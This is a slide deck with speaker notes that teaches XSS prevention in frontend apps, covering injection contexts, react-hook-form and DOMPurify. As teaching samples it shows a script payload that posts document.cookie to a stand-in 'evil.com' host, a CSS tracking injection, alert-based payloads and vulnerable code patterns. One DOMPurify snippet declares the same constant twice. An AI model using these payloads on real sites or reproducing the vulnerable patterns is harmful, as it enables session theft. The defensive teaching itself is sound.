---
theme: seriph
background: https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1920
class: 'text-center'
highlighter: shiki
lineNumbers: true
info: |
  ## Input Validation for Frontend Applications
  Understanding XSS vulnerabilities and best practices for secure input validation.
drawings:
  persist: false
css: unocss
wakeLock: "build"
---

# Input Validation for Frontend Applications

Securing Your Applications Against XSS Vulnerabilities

<div class="pt-12">
  <span class="text-sm opacity-75">
    Press Space to navigate through the slides
  </span>
</div>

<!--
Welcome everyone! Today we'll be diving deep into input validation for frontend applications, with a focus on XSS vulnerabilities and practical solutions.

Introduction points:
- Introduce yourself
- Set expectations for the presentation
- Mention the interactive demo at the end
- Estimated time: 30-45 minutes
-->

---
layout: default
---

# Agenda

<v-clicks>

1. Understanding XSS Vulnerabilities
   - Reflected XSS
   - Stored XSS
   - DOM-based XSS

2. Validation Contexts (HTML, JS, CSS, URL)

3. Input Validation & User Experience

4. Performance Benefits

5. Validation Libraries (react-hook-form & DOMPurify)

6. Live Demo

</v-clicks>

<!--
Here's what we'll cover today. We'll start with security fundamentals, then move into practical implementation, and finish with a live demonstration.

Timing suggestion: 2 minutes
-->

---
layout: two-cols
---

# What is XSS?

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web applications.

<v-clicks>

### The Risk
- Steal user credentials
- Hijack sessions
- Deface websites
- Redirect to malicious sites
- Access sensitive data

</v-clicks>

::right::

<div class="pl-8">

```html {all|2|3|all}
<!-- Vulnerable Code -->
<div>
  {userInput}
</div>

<!-- Attack Payload -->
<script>
  fetch('evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

</div>

<!--
XSS is one of the most common web vulnerabilities. When user input is rendered without proper sanitization, attackers can execute arbitrary JavaScript in the context of your application.

Key points:
- XSS has been in OWASP Top 10 for years
- Can affect any application that renders user input
- The consequences can be devastating

Timing: 3 minutes
-->

---
layout: default
---

# Reflected XSS

Malicious script is reflected off the web server (usually in URL parameters)

<v-clicks>

### How It Works
1. Attacker crafts a malicious URL
2. Victim clicks the link
3. Server reflects the input back without sanitization
4. Browser executes the malicious script

</v-clicks>

```javascript {all|2|5-6|all}
// Vulnerable endpoint
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found</p>
  `);
});

// Malicious URL
// https://example.com/search?q=<script>alert(document.cookie)</script>
```

<!--
Reflected XSS is typically delivered through phishing campaigns or malicious links.

Real-world example: In 2019, a reflected XSS vulnerability was found in Google Search that could have exposed user data.

Key takeaway: Never trust URL parameters or any user-controlled input.

Timing: 3 minutes
-->

---
layout: default
---

# Stored XSS

Malicious script is permanently stored on the server (database, file system, etc.)

<v-clicks>

### How It Works
1. Attacker submits malicious input
2. Server stores it without sanitization
3. Other users view the content
4. Malicious script executes for all viewers

</v-clicks>

```javascript {all|3-8|10-14|all}
async function saveComment(userId, text) {
  await db.comments.insert({
    user_id: userId,
    comment_text: text,
    created_at: new Date()
  });
}

function renderComments() {
  return comments.map(c =>
    `<div class="comment">${c.comment_text}</div>`
  ).join('');
}
```

<!--
Stored XSS is particularly dangerous because:
- It affects all users who view the content
- The attack persists even after the attacker is gone
- It can create a worm-like spread

Famous example: The Samy worm on MySpace (2005) - one of the fastest spreading viruses, used stored XSS to propagate.

Timing: 3 minutes
-->

---
layout: default
---

# DOM-based XSS

Vulnerability exists in client-side code; server never sees the malicious payload

<v-clicks>

### How It Works
1. Client-side JavaScript reads user-controlled data
2. Data is written to dangerous sink without sanitization
3. Malicious code executes entirely in the browser

</v-clicks>

```javascript {all|1-2|4-6|all}
// Attacker crafts URL
// https://example.com/#<img src=x onerror='alert(document.cookie)'>

// Vulnerable: reading from URL hash
const userInput = location.hash.substring(1);
document.getElementById('welcome').innerHTML = userInput;

// No server interaction needed!
```

<!--
DOM-based XSS is unique because:
- The malicious payload never reaches the server
- Traditional server-side defenses won't catch it
- Requires client-side validation and sanitization

This is becoming more common with SPAs and client-side routing.

Real example: Facebook had a DOM-based XSS vulnerability in 2018 affecting their messenger.

Timing: 3 minutes
-->

---
layout: section
class: text-center
---

# Validation Contexts

Understanding where and how to safely handle user input

<!--
Now that we understand the threats, let's look at the different contexts where we need to validate input. Each context has different rules and safe approaches.

Timing: 1 minute (transition slide)
-->

---
layout: two-cols
---

# HTML Context

Rendering user input as HTML content

### Unsafe
```html
<div>{userInput}</div>
```

### Safe Sinks
<v-clicks>

- `textContent`
- `innerText`
- `setAttribute()` (for non-event attributes)
- Template literals with escaping

</v-clicks>

::right::

<div class="pl-8">

```javascript
// Unsafe
element.innerHTML = userInput;

// Safe approaches
element.textContent = userInput;

// Or use a sanitizer
import DOMPurify from 'dompurify';
element.innerHTML =
  DOMPurify.sanitize(userInput);

// React (safe by default)
<div>{userInput}</div>
```

</div>

<!--
HTML context is where most XSS vulnerabilities occur. The key is understanding safe vs unsafe methods.

Key points:
- innerHTML is dangerous without sanitization
- textContent automatically escapes
- Modern frameworks like React escape by default
- When you need HTML, use a sanitizer like DOMPurify

Timing: 3 minutes
-->

---
layout: two-cols
---

# HTML Attribute Context

Setting attribute values from user input

### Vulnerable Attributes
<v-clicks>

- Event handlers (`onclick`, `onerror`)
- `href` (with `javascript:`)
- `src` (for scripts)
- `style` (CSS injection)

</v-clicks>

::right::

<div class="pl-8">

```javascript
// Unsafe
const img = `<img src="${userInput}">`;

// Attack payload
// " onerror="alert(1)

// Result
// <img src="" onerror="alert(1)">

// Safe approach
const img = document.createElement('img');
img.setAttribute('src', userInput);

// Or validate/sanitize first
if (isValidURL(userInput)) {
  img.src = userInput;
}
```

</div>

<!--
HTML attributes require special attention because attackers can break out of the attribute context.

Key points:
- Always validate URLs before using in href/src
- Never use user input in event handler attributes
- Use setAttribute() instead of string concatenation
- Validate against expected patterns

Timing: 2 minutes
-->

---
layout: default
---

# JavaScript Context

Injecting user input into JavaScript code

<v-clicks>

### Never Do This
```javascript
const userInput = getUserInput();
eval(`console.log("${userInput}")`);  // DANGEROUS!

const script = `var name = "${userInput}";`;  // DANGEROUS!
```

### Safe Alternatives
```javascript
// Use JSON for data passing
const config = JSON.parse(safeJSONString);

// Use data attributes
<div data-user-name={sanitizedName}></div>

// Pass through proper APIs
window.postMessage({ name: userName }, targetOrigin);
```

</v-clicks>

<!--
JavaScript context is particularly dangerous because you're executing code.

Key rules:
- NEVER use eval() with user input
- NEVER concatenate user input into JavaScript strings
- Use JSON.parse for structured data
- Use data attributes to pass data from HTML to JS
- Avoid Function constructor with user input

Real example: PayPal had a vulnerability where user input was used in eval().

Timing: 2 minutes
-->

---
layout: two-cols
---

# CSS Context

User input in style attributes or stylesheets

### Risks
<v-clicks>

- `expression()` in IE (legacy)
- `url()` can load external resources
- `-moz-binding` (Firefox legacy)

</v-clicks>

::right::

<div class="pl-8">

```javascript
// Unsafe
const style = `color: ${userInput}`;
element.style = style;

// Attack
// red; background: url('evil.com/track')

// Safe approach
// Whitelist allowed properties
const allowedColors = {
  red: '#ff0000',
  blue: '#0000ff',
  green: '#00ff00'
};

const color = allowedColors[userInput];
if (color) {
  element.style.color = color;
}
```

</div>

<!--
CSS context is often overlooked but can be exploited.

Key points:
- Whitelist approach is best for CSS
- Never allow arbitrary style strings
- Validate color values, sizes, etc.
- Modern browsers have removed most dangerous CSS features
- Still possible to exfiltrate data through CSS

Timing: 2 minutes
-->

---
layout: default
---

# URL Context

Handling user input in URLs

<v-clicks>

### Dangerous Schemes
- `javascript:` - executes JS
- `data:` - can contain HTML/JS

### Safe Approach
```javascript
function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    // Only allow http, https, mailto
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Usage
const link = document.createElement('a');
if (isSafeURL(userInput)) {
  link.href = userInput;
}
```

</v-clicks>

<!--
URL context requires protocol validation to prevent JavaScript execution.

Key points:
- Always parse and validate URLs
- Whitelist allowed protocols
- Be aware of relative URLs
- Validate before using in href, src, etc.

Common attack: javascript:alert(1)

Timing: 2 minutes
-->

---
layout: section
class: text-center
---

# Input Validation & User Experience

Why validation matters beyond security

<!--
Now let's shift gears and talk about how input validation improves the overall user experience.

Timing: 1 minute (transition)
-->

---
layout: default
---

# UX Benefits of Input Validation

Frontend validation creates a sleek, intuitive user experience

<v-clicks>

### Immediate Feedback
- Users know instantly if input is valid
- No waiting for server round-trip
- Reduce frustration and abandonment

### Clear Communication
- Specific error messages guide users
- Highlight exactly what needs fixing
- Progressive validation as users type

### Professional Feel
- Shows attention to detail
- Builds trust with users
- Reduces support requests

</v-clicks>

<!--
Good validation is invisible when it works, helpful when it doesn't.

Statistics to mention:
- 67% of users abandon forms due to complexity or errors
- Real-time validation can improve completion rates by 22%
- Clear error messages reduce support tickets by up to 30%

The frontend should be sleek, informational, and intuitive - validation is paramount to these objectives.

Timing: 3 minutes
-->

---
layout: two-cols
---

# Performance Benefits

Client-side validation reduces unnecessary server calls

<v-clicks>

### Without Frontend Validation
1. User submits form
2. Server validates
3. Returns errors
4. User fixes
5. Repeat...

**Result:** Multiple round trips, slow experience

</v-clicks>

::right::

<div class="pl-8">

<v-clicks>

### With Frontend Validation
1. User types
2. Instant validation
3. User fixes immediately
4. Submit only valid data

**Result:** One round trip, fast experience

### Additional Benefits
- Lower server load
- Reduced bandwidth
- Better scalability
- Cost savings

</v-clicks>

</div>

<!--
Frontend validation is not just about UX - it has real performance and cost implications.

Key metrics:
- Can reduce server requests by 40-60%
- Decreases page load time
- Lowers infrastructure costs
- Improves application scalability

Important note: Frontend validation is not a replacement for backend validation - it's a complement!

Timing: 3 minutes
-->

---
layout: section
class: text-center
---

# Validation Libraries

Practical tools for secure input handling

<!--
Now let's look at two essential libraries that make validation easier and more secure.

Timing: 1 minute (transition)
-->

---
layout: default
---

# react-hook-form

Performant, flexible form validation library

<v-clicks>

### Key Features
- Minimal re-renders
- Built-in validation rules
- Easy integration with UI libraries
- TypeScript support
- Small bundle size (~11kb)

### Why Use It?
- Reduces boilerplate code
- Handles complex validation logic
- Excellent performance
- Great developer experience

</v-clicks>

<!--
react-hook-form has become the go-to form library for React applications.

Key points:
- Uses uncontrolled components by default (better performance)
- Validation only happens when needed
- Easy to compose complex validation rules
- Works well with schema validation libraries like Zod, Yup

Popularity: Over 43k GitHub stars, 13M+ weekly downloads

Timing: 2 minutes
-->

---
layout: default
---

# react-hook-form Example

```typescript {all|1|3-8|10-14|16-26|28-36|all}
import { useForm } from 'react-hook-form';

interface LoginFormData {
  email: string;
  password: string;
}

function LoginForm() {
  const { register, handleSubmit, formState: { errors } } = useForm<LoginFormData>();

  const onSubmit = (data: LoginFormData) => {
    // Data is already validated!
    console.log(data);
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('email', {
        required: 'Email is required',
        pattern: {
          value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
          message: 'Invalid email address'
        }
      })} />
      {errors.email && <span>{errors.email.message}</span>}

      <input type="password" {...register('password', {
        required: 'Password is required',
        minLength: {
          value: 8,
          message: 'Password must be at least 8 characters'
        }
      })} />
      {errors.password && <span>{errors.password.message}</span>}

      <button type="submit">Login</button>
    </form>
  );
}
```

<!--
This example shows how clean and declarative react-hook-form code is.

Walk through:
1. Import the useForm hook
2. Define TypeScript interface for type safety
3. Initialize the hook with the type
4. Create submit handler with validated data
5. Register email input with validation rules
6. Register password input with validation rules

Notice how little boilerplate there is compared to managing form state manually.

Timing: 3 minutes
-->

---
layout: default
---

# DOMPurify

Client-side HTML sanitizer to prevent XSS

<v-clicks>

### Key Features
- Removes dangerous HTML/JavaScript
- Configurable (whitelist/blacklist)
- Works in browser and Node.js
- Fast and reliable
- Regular security updates

### When to Use It
- Rendering user-generated HTML
- Rich text editor content
- Markdown rendering (after HTML conversion)
- Any untrusted HTML content

</v-clicks>

<!--
DOMPurify is the most trusted HTML sanitization library.

Key points:
- Developed and maintained by security researchers
- Used by major companies (Google, Microsoft, etc.)
- Actively maintained with security updates
- Provides defense-in-depth

Important: Use DOMPurify when you NEED to render HTML. If you can use textContent, that's safer.

Timing: 2 minutes
-->

---
layout: default
---

# DOMPurify Example

```javascript {all|1|3-9|11-15|17-23|all}
import DOMPurify from 'dompurify';

// Basic sanitization
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
console.log(clean);
// Output: <img src="x">

// Custom configuration
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false
});

// React component example
function UserComment({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href']
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Real-world example: sanitizing markdown output
import { marked } from 'marked';

function renderMarkdown(markdown) {
  const html = marked(markdown);
  return DOMPurify.sanitize(html);
}
```

<!--
DOMPurify is straightforward to use but incredibly powerful.

Key points:
1. Basic usage is just one function call
2. You can customize what tags/attributes are allowed
3. Works great with React's dangerouslySetInnerHTML
4. Perfect for sanitizing markdown output

Best practice: Be as restrictive as possible with ALLOWED_TAGS and ALLOWED_ATTR.

Timing: 3 minutes
-->

---
layout: section
class: text-center
---

# Live Demo

react-hook-form & DOMPurify in Action

<!--
Now for the fun part - let's see these libraries working together in a real application.

Demo preparation:
- Open the demo application
- Show the unsanitized version first
- Demonstrate an XSS attack
- Then show the sanitized version
- Demonstrate form validation

Timing: 5-7 minutes
-->

---
layout: default
---

# Demo: Form Validation + XSS Prevention

<ValidationDemo />

<!--
This interactive demo showcases everything we've discussed:
- Security: DOMPurify sanitizes all HTML to prevent XSS
- UX: Real-time validation provides immediate feedback
- Performance: Client-side validation reduces server load

Demo walkthrough:
1. Show how validation works as users type
2. Try to submit incomplete/invalid data
3. Click "Insert XSS Payload" to demonstrate XSS protection
4. Toggle "Show Unsanitized" to show the difference
5. Submit valid comments to see sanitization in action

Key points to emphasize:
- Notice how the form prevents submission until data is valid
- The XSS payload is harmless when sanitized
- Error messages are specific and helpful
- Character counter provides clear limits

Timing: 5-7 minutes
-->

---
layout: center
class: text-center
---

# Key Takeaways

<v-clicks>

- XSS vulnerabilities come in three types: Reflected, Stored, and DOM-based
- Different contexts (HTML, JS, CSS, URL) require different validation approaches
- Input validation improves UX and reduces server load
- Use react-hook-form for performant form validation
- Use DOMPurify when you need to render user-generated HTML
- Always validate on both client AND server
- Security is an ongoing process, not a one-time fix

</v-clicks>

<!--
Summary points to emphasize:

1. Security and UX go hand-in-hand
2. Client-side validation is essential but not sufficient
3. Use well-maintained libraries rather than rolling your own
4. Stay updated on security best practices

Timing: 2 minutes
-->

---
layout: center
class: text-center
---

# Questions?

Thank you for your attention!

<div class="pt-8 text-sm opacity-75">
  Additional resources:

  - OWASP XSS Prevention Cheat Sheet
  - react-hook-form documentation
  - DOMPurify GitHub repository
</div>

<!--
Q&A session guidelines:
- Take questions on any topic covered
- If you don't know, be honest and offer to follow up
- Keep answers concise
- Point to resources for deeper dives

Common questions to prepare for:
- "What about server-side validation?"
- "Which validation library is best?"
- "How do I handle file uploads?"
- "What about WebSockets and real-time data?"

Timing: 5-10 minutes for Q&A
-->
